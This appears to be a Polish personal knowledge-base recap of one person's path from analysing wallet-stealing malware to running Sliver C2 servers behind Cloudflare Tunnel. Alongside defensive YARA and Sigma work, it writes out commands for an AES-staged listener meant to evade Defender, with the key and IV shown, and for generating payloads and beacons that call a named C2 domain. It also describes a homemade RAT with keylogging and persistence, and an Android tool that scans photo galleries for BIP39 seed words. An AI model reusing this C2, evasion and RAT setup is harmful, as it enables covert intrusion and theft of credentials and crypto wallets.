---
title: "Droga przez cyberbezpieczeństwo"
date: 2026-08-15
updated: 2026-08-15
tags: [zasoby, dziennik, lab, recap]
status: completed
priority: high
category: lab
aliases:
  - Droga
  - Ścieżka od zera
---

# 🧠 Droga przez cyberbezpieczeństwo – podróż od zera do własnego narzędzia

## 📌 Wstęp
Ta notatka dokumentuje całą ścieżkę, którą przeszedłem – od pierwszego pytania o atak na Exodus, przez analizę malware, budowę infrastruktury C2, aż do stworzenia własnego RAT-a i OCR na Androida. To nie jest teoria – to praktyka, która dała mi realne umiejętności.

---

## 🔎 Faza 1: Analiza malware i reverse engineering

### Cel
Zrozumieć, jak działają wirusy kradnące portfele (Exodus) i jak je analizować.

### Kroki
1. **Pobieranie próbek z MalwareBazaar**:
   - IronWorm (Linux ELF)
   - SparkKitty (Android/iOS)
   - RemusStealer (Windows PE)
   - Backdoor Go (easports.gg)

2. **Analiza statyczna**:
   - `file`, `strings`, `sha256sum` – podstawowe informacje.
   - `PEStudio` – nagłówki PE, importy, entropia.
   - `radare2` – dezasemblacja, śledzenie przepływu.
   - `Ghidra` – głęboka analiza, dekompilacja, lista API.

3. **Odtwarzanie algorytmów**:
   - Custom hash w shellcodzie (IronWorm).
   - Dynamiczne ładowanie API (backdoor Go).

4. **Budowa pipeline'u do masowej analizy**:
   - `batch_analyze.sh` – szybki triage APK i PE.
   - `pipeline.sh` – pełna analiza z raportami JSON/HTML.
   - `nightly_pipeline.sh` – automatyczne uruchamianie co noc (cron).

### Narzędzia
- `apktool`, `jadx` – dekompilacja APK.
- `pefile`, `readpe` – analiza PE.
- `YARA` – tworzenie reguł detekcji.
- `Ghidra` – reverse engineering.

### Osiągnięcia
- Klasyfikacja całego korpusu próbek: RAT, backdoor, stealer, dropper, phishing, packed.
- Reguły YARA dla backdoora Go (`Backdoor_EASports_Go`).
- Reguły Sigma dla SIEM (wykrywanie sekwencji `NetUserAdd` + `RegSetValueExW`).

Powiązane: [[Klasyfikacja_Korpus]] · [[Pipeline_Analizy]] · [[Backdoor_Go]] · [[IOC_Backdoor]] · [[Exodus_Modyfikacja]]

---

## 🏗️ Faza 2: Infrastruktura C2 (Sliver + Cloudflare)

### Cel
Postawić ukryty, działający serwer do testów C2.

### Kroki
1. **Wybór VPS-ów**:
   - `5.175.189.133` – Ubuntu 24.04 (główny C2 + pipeline).
   - `5.175.189.139` – Debian 12 (backup C2).
   - `5.175.189.57` – Windows Server 2022 (laboratorium + narzędzia).

2. **Instalacja Sliver C2**:
   ```bash
   curl https://sliver.sh/install | sudo bash
   ```

3. **Cloudflare Tunnel**:
   - Ukrywa publiczny IP VPS.
   - Routing: `DNS → Cloudflare → Tunnel → VPS → Sliver`.
   - Domeny: `c2.maskencrypt.eu`, `c2-drugi.maskencrypt.eu`.

4. **Konfiguracja listenera HTTPS**:
   ```bash
   https --lhost 127.0.0.1 --lport 443
   ```

5. **AES staging (omijanie Defendera)**:
   ```bash
   stage-listener --url tcp://0.0.0.0:8443 --profile bypass -C deflate9 \
     --aes-encrypt-iv '8y/B?E(G+KbPeShV' \
     --aes-encrypt-key 'D(G+KbPeShVmYq3t'
   ```

6. **Generowanie payloadów**:
   ```bash
   generate --http https://c2.maskencrypt.eu --os windows --save payload.exe
   generate beacon --http https://c2.maskencrypt.eu --os windows --save beacon.exe
   ```

### Narzędzia
- Sliver C2, Cloudflare Tunnel, UFW, Fail2ban.

### Osiągnięcia
- Dwa niezależne C2 z Cloudflare Tunelem.
- AES staging (szyfrowanie payloadu).
- Payloady dla Windows, Linux, macOS.
- Bot Telegram do zarządzania C2.

Powiązane: [[Infrastruktura_C2]] · [[Sliver_C2]] · [[Cloudflare_Konfiguracja]] · [[Lab/Hosts]] · [[Laboratorium_Windows]]

---

## 🤖 Faza 3: Automatyzacja i narzędzia

### Cel
Zautomatyzować powtarzalne zadania i zbudować narzędzia wspomagające pracę.

### Kroki
1. **Pipeline analizy**:
   - `batch_analyze.sh` – szybki triage.
   - `pipeline.sh` – pełna analiza z raportami.
   - `nightly_pipeline.sh` – nocne uruchomienie (cron).

2. **Generator YARA**:
   - Automatyczne tworzenie reguł na podstawie analizy PE/APK.
   - Zintegrowany z pipeline'm.

3. **Dashboard IOC**:
   - `dash.maskencrypt.eu` – centralny widok na IOC, klasyfikację, statystyki.
   - Działa jako usługa systemd (`ioc-dashboard.service`).

4. **Bot Telegram**:
   - Komendy: `/dashboard`, `/status`, `/wirus <nazwa>`.
   - Integracja z Obsidian.

5. **Synchronizacja Obsidian z GitHubem**:
   - Vault na VPS: `/root/obsidian-vault`.
   - Repozytorium: `dariamucha666-svg/maldev2`.
   - Auto-commit co 15 minut (cron).

### Narzędzia
- Python, PowerShell, Bash, cron, Git, systemd.

### Osiągnięcia
- Automatyczny pipeline analizy APK i PE.
- Dashboard z IOC i klasyfikacją.
- Bot Telegram jako interfejs do zarządzania.
- Synchronizacja notatek z GitHubem.

Powiązane: [[Pipeline_Analizy]] · [[Dashboard_IOC]] · [[Telegram_Obsidian_Bot]] · [[Git_Sync]] · [[Automatyzacja]]

---

## 📱 Faza 4: Tworzenie własnych narzędzi

### Cel
Zbudować własne, działające narzędzia ofensywne i defensywne.

### Kroki
1. **Prototyp OCR na Androida** (`ImageTextExtractor`):
   - Skanowanie obrazów z galerii.
   - Google ML Kit do OCR.
   - Lista BIP39 (2048 słów).
   - Podświetlanie dopasowanych słów na czerwono.
   - Brak uprawnień internetowych – zero wycieku danych.

2. **Własny RAT w Pythonie**:
   - Serwer C2 (`server.py` – nasłuch na porcie 4444).
   - Agent (`agent.py` – łączy się z C2, wykonuje komendy).
   - Funkcje: `whoami`, `sysinfo`, `screenshot`, `keylog_start`, `keylog_stop`, `shell`, `persistence`.
   - Kompilacja do `.exe` (pyinstaller).

3. **Wykorzystanie technik z backdoora Go**:
   - Persistence przez rejestr (Run key).
   - Keylogger przez Windows API (`GetAsyncKeyState`).
   - Dynamiczne ładowanie API (ctypes).

### Narzędzia
- Kotlin, Android Studio, Google ML Kit.
- Python, pyinstaller, pyautogui, ctypes.

### Osiągnięcia
- Działający prototyp OCR na Androida.
- Własny RAT z C2, keyloggerem, screenshotem, persistence.

Powiązane: [[Prototyp_OCR_Android]] · [[Wlasny_RAT]] · [[Wlasny_Stealer]] · [[Backdoor_Go]]

---

## 📚 Faza 5: Dokumentacja i organizacja wiedzy

### Cel
Zbudować bazę wiedzy, która będzie wspierać dalszą pracę.

### Kroki
1. **Struktura Obsidian**:
   - `_Dashboard` – strona główna, widoki Dataview.
   - `_Templates` – szablony notatek (analiza malware, dziennik, projekt).
   - `Projekty` – aktywne projekty (C2, pipeline, RAT, OCR).
   - `Analizy` – analizy malware, IOC, raporty.
   - `Dzienniki` – codzienne zapisy pracy.

2. **Wtyczki Obsidian**:
   - Dataview, Tasks, Calendar, Templater, QuickAdd, Git, Kanban.

3. **Automatyczne logowanie**:
   - PowerShell: `Start-Transcript`.
   - Linux: `script`.
   - Pipeline: automatyczne zapisywanie raportów do Obsidian.

### Narzędzia
- Obsidian, Git, Markdown, Dataview.

### Osiągnięcia
- Kompletna baza wiedzy w Obsidian.
- Synchronizacja z GitHubem.
- Automatyczne logowanie terminala i pipeline'u.

Powiązane: [[Dashboard]] · [[Home]] · [[Dokumentacja]] · [[Obsidian_Workflow]] · [[Obsidian_Auto_Log]]

---

## 🧠 Podsumowanie – czego się nauczyłem

| Obszar | Umiejętności |
|--------|--------------|
| **Analiza malware** | Ghidra, YARA, radare2, strings, PEStudio, dekompilacja APK. |
| **Infrastruktura C2** | Sliver, Cloudflare Tunnel, AES staging, payloady. |
| **Automatyzacja** | Bash, PowerShell, Python, cron, systemd, pipeline. |
| **Programowanie** | Python (RAT, serwer), Kotlin (Android), Bash, PowerShell. |
| **Dokumentacja** | Obsidian, Git, Markdown, szablony, notatki. |
| **Tworzenie narzędzi** | RAT, OCR na Androida, generator YARA, dashboard, bot Telegram. |

---

## 🚀 Co dalej? (perspektywy)

| Obszar | Co można zrobić |
|--------|-----------------|
| **Rozbudowa RAT-a** | Dodać NetUserAdd, RegSetValueExW, eskalację uprawnień. |
| **Wersja na iOS** | Przenieść OCR na Apple Vision. |
| **Zaawansowana analiza** | Dynamiczna analiza (Windows VM + ProcMon, Wireshark). |
| **Publikacja** | Blog/YouTube z analizami, GitHub z narzędziami. |
| **Certyfikaty** | OSCP, PNPT – potwierdzenie umiejętności. |

---

## 🔗 Linki do kluczowych notatek

- [[Infrastruktura_C2]]
- [[Pipeline_Analizy]]
- [[Wlasny_RAT]]
- [[Prototyp_OCR_Android]]
- [[Backdoor_Go]]
- [[IOC_Backdoor]]
- [[Dashboard]]

---

**Ostatnia aktualizacja:** 2026-08-15
